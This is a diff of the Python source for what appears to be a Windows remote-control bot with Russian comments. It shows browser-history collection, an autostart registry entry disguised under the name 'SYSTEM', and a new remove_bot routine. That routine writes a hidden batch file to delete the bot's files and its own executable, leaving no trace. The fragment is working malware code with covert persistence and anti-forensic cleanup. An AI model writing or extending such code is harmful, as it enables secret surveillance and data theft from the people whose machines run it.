@@ -3,12 +3,14 @@ import getpass
 import platform
 import shutil
 import socket
+import subprocess
 import time
 from datetime import datetime
 from io import StringIO
 from subprocess import Popen, PIPE
 from time import strftime, sleep
 import uuid
+import winreg
 
 # Сетевые
 import requests
@@ -388,9 +390,25 @@ def get_browser_log(browser='chrome', limit=150):
     return get_browser_history_log_to_file(browser=browser, limit=limit)
 
 
-def self_destruct():
-    shutil.rmtree(BASE_DIR, ignore_errors=True)
-    os._exit(0)
+def remove_bot():
+    """Удаляет бота из автозагрузки и удаляет файлы"""
+    try:
+        # Удаляем из автозагрузки
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                             winreg.KEY_SET_VALUE)
+        winreg.DeleteValue(key, "SYSTEM")
+        winreg.CloseKey(key)
+
+        # Создаем bat для удаления
+        bat_path = os.path.join(os.environ['TEMP'], 'del.bat')
+        with open(bat_path, 'w') as f:
+            f.write(
+                f'@echo off\ntimeout /t 1 /nobreak > nul\nrmdir /s /q "{BASE_DIR}"\ndel /f /q "{sys.argv[0]}"\ndel "%~f0"')
+
+        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        return "✅ Бот удален"
+    except:
+        return "❌ Ошибка"
 
 
 def create_desktop_folders(count_folders, base_name, filler_text):
